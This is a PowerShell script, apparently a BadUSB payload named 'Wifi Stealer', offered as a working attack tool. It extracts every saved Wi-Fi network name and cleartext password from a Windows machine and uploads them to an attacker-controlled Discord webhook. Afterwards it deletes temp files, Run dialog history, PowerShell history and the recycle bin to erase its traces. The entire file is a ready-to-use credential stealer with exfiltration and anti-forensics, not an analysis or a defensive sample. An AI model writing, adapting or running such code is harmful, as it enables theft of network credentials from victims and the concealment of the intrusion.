#===============================================
# Code Name : Wifi Stealer | BADBT
# Author 	: netwrkspider
# website  	: www.netwrkspider.org
#===============================================

#Capture wifi password 

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

$wifiProfiles > $env:TEMP/wifi-sec.txt


#upload text file into Discord via Webhooks 

function Xfer-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$dchookurl = "$dcwebhook"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $dchookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $dchookurl}
}

if (-not ([string]::IsNullOrEmpty($dcwebhook))){Xfer-Discord -file "$env:TEMP/wifi-sec.txt"}

 

#############################################

function Wipe-Exfil { 

# wipe temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# wipeout run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# wipeout powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

#=============================================

if (-not ([string]::IsNullOrEmpty($ce))){Wipe-Exfil}


RI $env:TEMP/wifi-sec.txt